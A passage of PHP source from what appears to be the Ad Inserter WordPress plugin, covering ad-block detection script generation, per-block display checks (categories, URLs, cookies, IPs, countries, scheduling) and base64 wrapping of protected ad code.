//        'ai_adb_detection_type_log',
//        'ai_adb_detection_type',
//        'ai_adb_fe_dbg',
//        'ai_adb_get_script',
//        'ai_adb_data',
//        'ai_adb_external_scripts',
//        'ai_adb_checks',
//        'ai_adb_content_css_begin_class',
//        'ai_adb_content_css_end_class',
//        'ai_adb_content_delete_begin_class',
//        'ai_adb_content_delete_end_class',
//        'ai_adb_content_replace_begin_class',
//        'ai_adb_content_replace_end_class',
//        'ai_adb_cookie_value',
//        'ai_adb_name',
//        'ai_adb_message_code',
//        'ai_adb_attribute',
//        'ai_adb_1',
//        'ai_adb_2',
//        'ai_adb_3',
//        'ai_adb_4',
//        'ai_adb_5',
//        'ai_adb_6',
//        'ai_adb_7',
//        'ai_adb_8',
//        'ai_adb_9',
//        'ai_adb_10',
//        'ai_adb_11',
//        'ai_adb_12',

//        'ai-adb-url', // Replace also in Free / Standard mode
//      );

//      $ai_adb_new_names = array ();
//      foreach ($ai_adb_names as $name) {
//        if ($name == 'ai-adb-seed') {
//          $ai_adb_new_names []= AI_ADB_SEED;
//        }
//        elseif ($name == 'ai-adb-url') {
//          $ai_adb_new_names []= $upload_dir ['baseurl'] . '/ad-inserter/' . $ai_adb_id.'/';
//        }
//        else $ai_adb_new_names []= ai_random_name (AI_ADB_SEED.$name, 12);
//      }

      @mkdir ($script_path_ai, 0755, true);
      @mkdir ($script_path, 0755, true);

      file_put_contents ($script_path . AI_ADB_CHECK_FILENAME, $ai_file_check);

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_1_FILENAME);
      file_put_contents ($script_path . AI_ADB_1_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_2_FILENAME);
      file_put_contents ($script_path . AI_ADB_2_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_3_FILENAME);
      file_put_contents ($script_path . AI_ADB_3_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_4_FILENAME);
      file_put_contents ($script_path . AI_ADB_4_FILENAME, ai_rename_ids ($script));

      $code = ai_adb_code () . ai_adb_code_2 ();
      $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
      $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
      file_put_contents ($script_path . AI_ADB_FOOTER_FILENAME, ai_rename_ids ($code));

      file_put_contents ($script_path_ai .  'index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");
      file_put_contents ($script_path .     'index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");

      if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) file_put_contents ($script_path . AI_ADB_DBG_FILENAME, ''); else @unlink ($script_path . AI_ADB_DBG_FILENAME);
    }
  }
}

function ai_adb_code_2 () {
  return ai_get_js ('ai-adb-pro', false);
}

function ai_dst_settings (&$dst_settings) {
  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst_settings ['tracking']            = DST_Client::DST_TRACKING_NO_OPTIN;
    $dst_settings ['use_email']           = DST_Client::DST_USE_EMAIL_NO_OPTIN;
    $dst_settings ['multisite_tracking']  = DST_Client::DST_MULTISITE_SITES_NO_OPTIN;
    $dst_settings ['deactivation_form']   = false;
  }
}

function ai_dst_options_2 (&$options) {
  global $ad_inserter_globals;

  $options ['key']      = $ad_inserter_globals ['LICENSE_KEY'];
  $options ['status']   = $ad_inserter_globals ['AI_STATUS'];
  $options ['type']     = $ad_inserter_globals ['AI_TYPE'];
  $options ['counter']  = $ad_inserter_globals ['AI_COUNTER'];
  $options ['update']   = get_option (AI_UPDATE_NAME, 0);
  $options ['site_id']  = DEFAULT_REPORT_DEBUG_KEY;
  $options ['man_id']   = get_management_key ();
}

function add_footer_inline_scripts_1 () {
  global $ai_wp_data, $ai_adb_id, $block_object;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {

    if ($ai_wp_data [AI_ADB_DETECTION] && !isset ($ai_wp_data [AI_ADB_SHORTCODE_DISABLED]) && !$ai_wp_data [AI_WP_AMP_PAGE]) {

      $adb_extra_js_code = '';
      $adb_extra_js_code_index = rand (1, 10);

      if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
        $upload_dir = wp_upload_dir();
        $script_url = $upload_dir ['baseurl'] . '/ad-inserter/'.$ai_adb_id.'/';

        $script_path_ai = $upload_dir ['basedir'] . '/ad-inserter/';
        $script_path = $script_path_ai.$ai_adb_id.'/';

        if (get_adb_action (true) == AI_ADB_ACTION_MESSAGE && get_undismissible_message (true)) {
          $adb_extra_js_code = "<script>\n";

          $js_code = ai_get_js ('ai-adb-extra');
          $js_code = 'setTimeout (function() {return (new Function (b64d ("' . base64_encode (check_footer_inline_scripts ($js_code)) . '")) ())}, '. rand (2345, 6789) .');';
          $js_code = check_footer_inline_scripts ($js_code);

          $adb_extra_js_code .= $js_code;
          $adb_extra_js_code .= "</script>\n";
        }
      } else {
          $script_url = plugins_url ('js/', AD_INSERTER_FILE);

          $script_path = AD_INSERTER_PLUGIN_DIR.'js/';
        }

      if (is_ssl()) {
        $script_url = str_replace ('http://', 'https://', $script_url);
      }

      echo '<!-- Code for ad blocking detection -->', "\n";
      echo '<!--noptimize-->', "\n";

      if ($adb_extra_js_code_index < 5) {
        echo $adb_extra_js_code;
      }

      if (get_adb_external_scripts ()) {
        echo ai_adb_external_scripts ();
      }

      if (!defined ('AI_ADB_NO_BANNER_AD')) {
        echo '<div id="banner-advert-container" class="adsense sponsor-ad" style="position:absolute; z-index: -10; height: 1px; width: 1px; top: -100px; left: -100px;"><img id="im_popupFixed" class="ad-inserter adsense ad-img ad-index" src="', AD_INSERTER_PLUGIN_IMAGES_URL, 'ads.png" width="1" height="1" alt="pixel"></div>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADS_JS')) {
        echo '<script async id="ai-adb-ads" src="', $script_url, AI_ADB_1_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_1_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_SPONSORS_JS')) {
        echo '<script async id="ai-adb-sponsors" src="', $script_url, AI_ADB_2_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_2_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADVERTISING_JS')) {
        echo '<script async id="ai-adb-advertising" src="', $script_url, AI_ADB_3_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_3_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADVERTS_JS')) {
        echo '<script async id="ai-adb-adverts" src="', $script_url, AI_ADB_4_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_4_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_BANNER_JS')) {
        echo '<script async id="ai-adb-banner" src="', plugins_url ('js/banner.js',  dirname (__FILE__)), "?ver=", AD_INSERTER_VERSION, '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_300x250_JS')) {
        echo '<script async id="ai-adb-300x250" src="', plugins_url ('js/300x250.js', dirname (__FILE__)), "?ver=", AD_INSERTER_VERSION, '"></script>', "\n";
      }

      if ($adb_extra_js_code_index >= 5) {
        echo $adb_extra_js_code;
      }

      echo '<!--/noptimize-->', "\n";
      echo '<!-- Code for ad blocking detection END -->', "\n";
    }
  }
}

function add_footer_inline_scripts_2 () {
  global $ai_wp_data, $ai_adb_id, $block_object;

  $inline_js = ai_inline_js ();
                                                                                                                                      // VIEWPORT separators or CHECK viewport
  if (get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW || get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT || $ai_wp_data [AI_CLIENT_SIDE_DETECTION] || $ai_wp_data [AI_CLIENT_SIDE_INSERTION]) {
    echo ai_get_js ('ai-ip-data');
    if ($inline_js) {
      echo ai_get_js ('ai-ip');
    }
  }

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION] && !isset ($ai_wp_data [AI_ADB_SHORTCODE_DISABLED])) {

      if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
        $code = ai_get_js ('ai-adb-data', false);
        $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
        $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
        echo ai_replace_js_data (ai_rename_ids ($code));

        $upload_dir = wp_upload_dir();
        $script_path = $upload_dir ['basedir'] . '/ad-inserter/' . $ai_adb_id . '/';

        if (file_exists ($script_path . AI_ADB_FOOTER_FILENAME)) {
//          echo ai_replace_js_data (file_get_contents ($script_path . AI_ADB_FOOTER_FILENAME));
          echo ai_replace_js_data (file_get_contents ($script_path . AI_ADB_FOOTER_FILENAME), false);

          $debug_processing = ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_PROCESSING) != 0;
          if ($debug_processing) ai_log ('LOADING JS CODE: '. AI_ADB_FOOTER_FILENAME);
        }
      } else {
          $code = ai_get_js ('ai-adb-data', false);
          $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
          $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
          echo ai_replace_js_data ($code);

          $code = ai_adb_code () . ai_adb_code_2 ();
          $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
          $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
//          echo ai_replace_js_data ($code);
          echo ai_replace_js_data ($code, false);
        }

    }
  }

  if ($ai_wp_data [AI_TRACKING] && !isset ($ai_wp_data [AI_TRACKING_SHORTCODE_DISABLED])) {
    echo ai_get_js ('ai-tracking-data');
    if ($inline_js) {
      echo ai_get_js ('ai-tracking', false);
    }
  }
}

function ai_add_footer_html () {
  global $ai_wp_data;

  if (get_disable_block_insertions ()) return;

  if (isset ($ai_wp_data [AI_TRIGGER_ELEMENTS])) {
    foreach ($ai_wp_data [AI_TRIGGER_ELEMENTS] as $block => $data) {
      if (is_int ($data))
        echo '<div id="ai-position-'.$block.'" style="position: absolute; top: '.$data.'px;"></div>', "\n"; else
          echo '<div id="ai-position-'.$block.'" style="position: absolute;" data-ai-position-pc="'.$data.'"></div>', "\n";
    }
  }
}

function generate_alignment_css_2 () {
  $styles = array ();

  $styles [AI_ALIGNMENT_STICKY_LEFT]    = array (AI_TEXT_STICKY_LEFT,    get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_LEFT));
  $styles [AI_ALIGNMENT_STICKY_RIGHT]   = array (AI_TEXT_STICKY_RIGHT,   get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_RIGHT));
  $styles [AI_ALIGNMENT_STICKY_TOP]     = array (AI_TEXT_STICKY_TOP,     get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_TOP));
  $styles [AI_ALIGNMENT_STICKY_BOTTOM]  = array (AI_TEXT_STICKY_BOTTOM,  get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_BOTTOM));

  return $styles;
}

function ai_check_separators ($obj, $processed_code) {
  global $ai_wp_data;

  if (strpos ($processed_code, AD_CHECK_SEPARATOR) !== false) {
    $obj->check_block = true;

    $check_codes = explode (AD_CHECK_SEPARATOR, $processed_code);

    if (trim ($check_codes [0]) == '') {
      unset ($check_codes [0]);
      $check_codes = array_values ($check_codes);
    } else array_unshift ($obj->shortcodes ['check'],  array ());

    $obj->check_codes = $check_codes;

    if ($ai_wp_data [AI_FORCE_SERVERSIDE_CODE]) {
      // Code for preview
      if ($obj->check_index >= count ($check_codes)) {
        $obj->check_index = 0;
      }
      $obj->check_codes_index = $obj->check_index;
    } else $obj->check_codes_index = 0;

    $obj->check_codes_data = $obj->shortcodes ['check'];

    foreach ($obj->check_codes_data as $index => $check_data) {
      if (isset ($check_data ['check']) && $check_data ['check'] == 'statistics') {
        $obj->check_statistics = true;
        break;
      }
    }

    if ($ai_wp_data [AI_FORCE_SERVERSIDE_CODE] && is_array ($obj->check_codes_data)) {
      $obj->check_names = array ();
      foreach ($obj->check_codes_data as $index => $check_data) {
        $check_name = '';
        foreach ($check_data as $check_type => $check_list) {
          if ($check_list != '') {
            if ($check_type == 'block') continue;
            if ($check_type == 'check') continue;
            $check_name .= ' '. $check_type . '="' . $check_list . '"';
          }
        }
        if ($check_name == '') $check_name = $index + 1;
        $obj->check_names []= $check_name;
      }
    }

    $processed_code = $check_codes [$obj->check_codes_index];
  }

  $obj->check_code_empty = false;
  if (!$ai_wp_data [AI_FORCE_SERVERSIDE_CODE] && is_array ($obj->check_codes_data) && isset ($obj->check_codes_data [$obj->check_codes_index])) {
    $check_data = '';

    $server_side_check = $obj->server_side_check ();
    $debug_processing = ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_PROCESSING) != 0;

    if ($debug_processing) {
      if (is_array ($obj->check_codes_data) && isset ($obj->check_codes_data [$obj->check_codes_index])) {
        $check_log_text = '';
        foreach ($obj->check_codes_data [$obj->check_codes_index] as $check_type => $check_list) {
          if ($check_list != '') {
            $check_log_text .= ' '. $check_type . '="' . $check_list . '"';
          }
        }
        ai_log ('BLOCK ' . $obj->number . ' CHECK [' . trim ($check_log_text) . ']');
      }
    }

    unset ($obj->check_css);
    unset ($obj->check_url_parameters);
    unset ($obj->check_url_parameter_list_type);
    unset ($obj->check_cookies);
    unset ($obj->check_cookie_list_type);
    unset ($obj->check_referers);
    unset ($obj->check_referers_list_type);
    unset ($obj->check_clients);
    unset ($obj->check_clients_list_type);
    unset ($obj->check_ip_addresses);
    unset ($obj->check_ip_addresses_list_type);
    unset ($obj->check_countries);
    unset ($obj->check_countries_list_type);
    unset ($obj->check_scheduling_start_time);
    unset ($obj->check_scheduling_end_time);
    unset ($obj->check_scheduling_days_in_week);
    unset ($obj->check_scheduling_type);
    unset ($obj->check_scheduling_fallback_block);

    $debug_separator = '-----------------------------------------------------------------------------';

    $obj->check_code_empty = true;
    foreach ($obj->check_codes_data [$obj->check_codes_index] as $check_type => $check_list) {
      if ($check_list != '') {
        if ($check_list [0] == '^') {
          $list_type = AI_BLACK_LIST;
          $check_list = substr ($check_list, 1);
        } else $list_type = AI_WHITE_LIST;

        if ($debug_processing) $single_check_log_text = 'BLOCK ' . $obj->number . ' CHECK ' . ($list_type == AI_WHITE_LIST ? '[W] ' : '[B] ') . $check_type . '=\'' . $check_list . '\'';

        switch ($check_type) {
          case 'css':
            $obj->check_css = $check_list;
            break;
          case 'category':
          case 'categories':
            if (!$obj->check_category ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              if ($debug_processing) ai_log ($debug_separator);
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'tag':
          case 'tags':
            if (!$obj->check_tag ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              if ($debug_processing) ai_log ($debug_separator);
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'taxonomy':
          case 'taxonomies':
            if (!$obj->check_taxonomy ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              if ($debug_processing) ai_log ($debug_separator);
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'id':
          case 'post-ids':
            if (!$obj->check_id ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              if ($debug_processing) ai_log ($debug_separator);
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'url':
          case 'urls':
            if (!$obj->check_url ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              if ($debug_processing) ai_log ($debug_separator);
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'viewport':
          case 'viewports':
            $obj->check_viewports           = $check_list;
            $obj->check_viewports_list_type = $list_type;
            break;
          case 'url-parameter':
          case 'url-parameters':
            switch ($server_side_check) {
              case true:
                if (!check_url_parameter_and_cookie_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  if ($debug_processing) ai_log ($debug_separator);
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
                  $obj->client_side_cookie_check_url = false;
                  $url_parameter_found = false;
                  $url_parameter_list_pass = check_url_parameter_list ($check_list, $list_type == AI_WHITE_LIST, $url_parameter_found);

                  if ($url_parameter_found && !$url_parameter_list_pass) return '';

                  if (!$url_parameter_found) $obj->client_side_cookie_check_url = true;

                  $obj->check_url_parameters           = $check_list;
                  $obj->check_url_parameter_list_type  = $list_type;
                break;
            }
            break;
          case 'cookie':
          case 'cookies':
            switch ($server_side_check) {
              case true:
                if (!check_cookie_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  if ($debug_processing) ai_log ($debug_separator);
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
                  $obj->client_side_cookie_check = true;

                  $obj->check_cookies           = $check_list;
                  $obj->check_cookie_list_type  = $list_type;
                break;
            }
            break;
          case 'referrer':
          case 'referrers':
            switch ($server_side_check) {
              case true:
                if (!check_referer_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  if ($debug_processing) ai_log ($debug_separator);
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
                  $obj->check_referers           = $check_list;
                  $obj->check_referers_list_type = $list_type;
                break;
            }
            break;
          case 'client':
          case 'clients':
            switch ($server_side_check) {
              case true:
                if (!check_client_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  if ($debug_processing) ai_log ($debug_separator);
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
                  $obj->check_clients           = $check_list;
                  $obj->check_clients_list_type = $list_type;
                break;
            }
            break;
          case 'scheduling':
            $scheduling_data = explode (',', str_replace ('  ', ' ', $check_list));
            if (count ($scheduling_data) >= 3 && count ($scheduling_data) <= 4) {
              $start_time = trim ($scheduling_data [0]);
              $end_time = trim ($scheduling_data [1]);
              $days_in_week = implode (',', str_split (trim (str_replace (' ', '', $scheduling_data [2]))));
              $fallback = isset ($scheduling_data [3]) ? (int) $scheduling_data [3] : 0;
              switch ($server_side_check) {
                case true:
                  if (!check_scheduling_time ($start_time, $end_time, $days_in_week, $list_type == AI_WHITE_LIST)) {

                    if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                    if ($debug_processing) ai_log ($debug_separator);
                    return '';
                  }
                  if ($debug_processing) ai_log ($single_check_log_text);
                  break;
                default:
                    $obj->check_scheduling_start_time = $start_time;
                    $obj->check_scheduling_end_time = $end_time;
                    $obj->check_scheduling_days_in_week = $days_in_week;
                    $obj->check_scheduling_type = $list_type == AI_WHITE_LIST ? AI_SCHEDULING_BETWEEN_DATES : AI_SCHEDULING_OUTSIDE_DATES;
                    $obj->check_scheduling_fallback_block = $fallback;
                  break;
              }
            }
            break;
          case 'ip-address':
          case 'ip-addresses':
            if (function_exists ('ai_check_geo_settings')) {
              switch ($server_side_check) {
                case true:
                  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
                  ai_check_geo_settings ();

                  if (function_exists ('check_ip_address_list')) {
                    if (!check_ip_address_list ($check_list, $list_type == AI_WHITE_LIST)) {
                      if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                      if ($debug_processing) ai_log ($debug_separator);
                      return '';
                    }
                    if ($debug_processing) ai_log ($single_check_log_text);
                  }
                  break;
                default:
//                  $client_side_list_check = $obj->get_ad_ip_address_list () != '' /*|| $obj->get_ad_ip_address_list_type () == AI_WHITE_LIST*/;
//                  if (!$client_side_list_check) {
                    $obj->check_ip_addresses           = $check_list;
                    $obj->check_ip_addresses_list_type = $list_type;
//                  } else {
//                      if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                    }
                  break;
              }
            }
            break;
          case 'country':
          case 'countries':
            $check_list = expanded_country_list ($check_list);

            if (function_exists ('ai_check_geo_settings')) {
              switch ($server_side_check) {
                case true:
                  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
                  ai_check_geo_settings ();

                  if (function_exists ('check_country_list')) {
                    if (!check_country_list ($check_list, $list_type == AI_WHITE_LIST)) {
                      if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                      if ($debug_processing) ai_log ($debug_separator);
                      return '';
                    }
                    if ($debug_processing) ai_log ($single_check_log_text);
                  }
                  break;
                default:
//                  $client_side_list_check = $obj->get_ad_country_list (true) != '' /*|| $obj->get_ad_country_list_type () == AI_WHITE_LIST*/;
//                  if (!$client_side_list_check) {
                    $obj->check_countries           = $check_list;
                    $obj->check_countries_list_type = $list_type;
//                  } else {
//                      if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                    }
                  break;
              }
            }
            break;
        }
      }
    }
    $obj->check_code_empty = false;
    $obj->check_code_insertions ++;
    if ($debug_processing) ai_log ('BLOCK ' . $obj->number . ' INSERTED CEHCK [' . trim ($check_log_text) . ']');
    if ($debug_processing) ai_log ($debug_separator);
  }

  return $processed_code;
}

function ai_process_protected_code ($obj, $processed_code) {
  global $ai_wp_data;

  if ($obj->get_protected () && !$ai_wp_data [AI_WP_AMP_PAGE]) {
    if ($obj->w3tc_code != '') {
      if ($ai_wp_data [AI_W3TC_DEBUGGING]) {
        $obj->w3tc_debug []= 'PROCESS PROTECTED CODE';
      }
    }

    for ($level = rand (2, 5); $level != 0; $level --) {
      $wrapper_class = 'ai-client-' . $obj->number . '-' . rand (1000, 9999) . rand (1000, 9999);
      $script_class  = 'ai-code-'   . $obj->number . '-' . rand (1000, 9999) . rand (1000, 9999);

      $prefix = '';
      $prefix_length = rand (5, 21);
      for ($prefix_index = $prefix_length; $prefix_index != 0; $prefix_index --) {
        switch (rand (1, 2)) {
          case 1:
            $prefix .= chr (ord ('A') + rand (0, 25));
            break;
          default:
            $prefix .= chr (ord ('a') + rand (0, 25));
            break;
        }
      }

      $protected_code = $obj->base64_encode_w3tc ($processed_code);
      $processed_code = '<div class="'.$wrapper_class.' no-visibility-check" data-code="'.$prefix.$protected_code.'" data-block="'.$obj->number.'"></div>'."\n";

      if (!get_disable_js_code ()) {
        $prefix_length = $prefix_length * 19 + rand (1, 17);
        $js_code = "ai_insert_client_code ('{$wrapper_class}', {$prefix_length}); var el = document.getElementsByClassName ('{$script_class}'); if (el.length != 0) {el [0].remove ();}";
        $processed_code .= ai_js_dom_ready ($js_code, true, $script_class);
      }

      // Recreate W3TC code
      if ($obj->w3tc_code != '') {
        $processed_code = $obj->regenerate_w3tc_code ($processed_code);
      }
    }

    $wrapper_class1 = 'ai-block-' . $obj->number . '-' . rand (1000, 9999) . rand (1000, 9999);
    $wrapper_class2 = 'ai-block-' . $obj->number . '-' . rand (1000, 9999) . rand (1000, 9999);
    $script_class   = 'ai-code-'  . $obj->number . '-' . rand (1000, 9999) . rand (1000, 9999);

    $protected_code = $obj->base64_encode_w3tc ($processed_code);
    $processed_code = '<div class="'.$wrapper_class1 . ' ' . $wrapper_class2 .' no-visibility-check" data-code="'.$protected_code.'" data-block="'.$obj->number.'"></div>'."\n";

    if (!get_disable_js_code ()) {
      $js_code = "ai_insert_code_by_class ('{$wrapper_class1}'); var el = document.getElementsByClassName ('{$wrapper_class2}'); if (el.length != 0) {el [0].remove ();} el = document.getElementsByClassName('{$script_class}'); if (el.length != 0) {el [0].remove ();}";
      $processed_code .= ai_js_dom_ready ($js_code, true, $script_class);
    }

    // Recreate W3TC code
    if ($obj->w3tc_code != '') {
      $processed_code = $obj->regenerate_w3tc_code ($processed_code);
    }

  }

  return $processed_code;
}

function ai_adb_check ($obj, $processed_code) {
  global $block_object, $ai_wp_data, $ad_inserter_globals;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {

    switch ($obj->get_adb_block_action ()) {
      case AI_ADB_BLOCK_ACTION_REPLACE:

          $globals_name = AI_ADB_FALLBACK_DEPTH_NAME;
          if (!isset ($ad_inserter_globals [$globals_name])) {
            $ad_inserter_globals [$globals_name] = 0;
          }

          $fallback_block = $obj->get_adb_block_replacement ();
          if ($fallback_block != '' && $fallback_block != 0 && $fallback_block <= 96 && $fallback_block != $obj->number && $ad_inserter_globals [$globals_name] < 2) {
            $ad_inserter_globals [$globals_name] ++;

            $adb_label = '';
            $no_adb_label = '';

            if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
              $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
              $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

              $adb_label =
                $debug_adb_on->adb_hidden_section_start () .
                $debug_adb_on->center_bar    (__('AD BLOCKING', 'ad-inserter')) .
                $debug_adb_on->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
                $debug_adb_on->adb_hidden_section_end ();

              $no_adb_label = $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter'));
            }

            $new_processed_code =
              $adb_label .
              "<div class='ai-adb-hide' data-ai-debug='$obj->number'>\n" .
                $no_adb_label .
                $processed_code .
              "</div>\n";

            if ($ai_wp_data [AI_W3TC_DEBUGGING]) {
              $obj->w3tc_debug []= 'PROCESS ADB REPLACEMENT';
            }

            $fallback_obj = $block_object [$fallback_block];
            $fallback_obj->hide_debug_labels = true;
            $fallback_code = $fallback_obj->ai_getProcessedCode ();
            $fallback_obj->hide_debug_labels = false;

            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
              $fallback_obj->w3tc_code = 'ai_w3tc_log_run (\'PROCESS ADB REPLACEMENT BLOCK '.$fallback_block.'\');' . $fallback_obj->w3tc_code;
              $fallback_code = $fallback_obj->generate_html_from_w3tc_code ();
            }

            $fallback_no_adb_label = '';

            if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
              $title = '';
              $counters = $fallback_obj->ai_get_counters ($title);

              $version_name = $fallback_obj->version_name == '' ? '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' : ' - ' . $fallback_obj->version_name;

              $fallback_block_name = $fallback_obj->number . ' ' . $fallback_obj->get_ad_name () . '<kbd data-separator=" - " class="ai-option-name">' . $version_name . '</kbd>';

              $debug_fallback = new ai_block_labels ('ai-debug-fallback');

              $fallback_no_adb_label  =
                $debug_fallback->adb_visible_section_start () .
                $debug_fallback->block_start () .
                $debug_fallback->bar ($fallback_block_name, '', __('AD BLOCKING REPLACEMENT', 'ad-inserter')) .
                $debug_fallback->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
                $debug_fallback->block_end () .
                $debug_fallback->adb_visible_section_end ();

              $fallback_code =
                $debug_fallback->block_start () .
                $debug_fallback->bar ($fallback_block_name, '', __('AD BLOCKING REPLACEMENT', 'ad-inserter'), $counters, $title) .
                '<div class="ai-code">' . $fallback_code . '</div>'.
                $debug_fallback->block_end ();
            }

            $fallback_tracking_block = $fallback_obj->get_tracking () ? $fallback_obj->number : 0;

            if (get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT) {
              $fallback_base64_code = ' data-code="' . base64_encode ($fallback_code) . '"';
              $fallback_code = '';
            } else $fallback_base64_code = '';


            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
              $tracking_data = '[#AI_DATA_TRACKING#]';
            } else {
                $block_counter = isset ($ad_inserter_globals [AI_BLOCK_COUNTER_NAME . $fallback_obj->number]) ? $ad_inserter_globals [AI_BLOCK_COUNTER_NAME . $fallback_obj->number] : 0;
//                $tracking_data = base64_encode ("[{$fallback_tracking_block},{$fallback_obj->code_version},\"{$fallback_obj->get_ad_name ()}\",\"{$fallback_obj->version_name}\",{$block_counter}]");
                $tracking_data = base64_encode ("[{$fallback_tracking_block},{$fallback_obj->tracking_index},\"{$fallback_obj->get_ad_name ()}\",\"{$fallback_obj->version_name}\",{$block_counter}]");
              }

            $new_processed_code .=
              $fallback_no_adb_label .
              "<div class='ai-adb-show' style='visibility: hidden; display: none;' data-ai-tracking='" . $tracking_data . "' data-ai-debug='$obj->number <= $fallback_obj->number'{$fallback_base64_code}>\n" .
                $fallback_code .
              "</div>\n";

            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
              // Generate code to update tracking data
              $fallback_obj->regenerate_w3tc_code ($obj->additional_code_after);
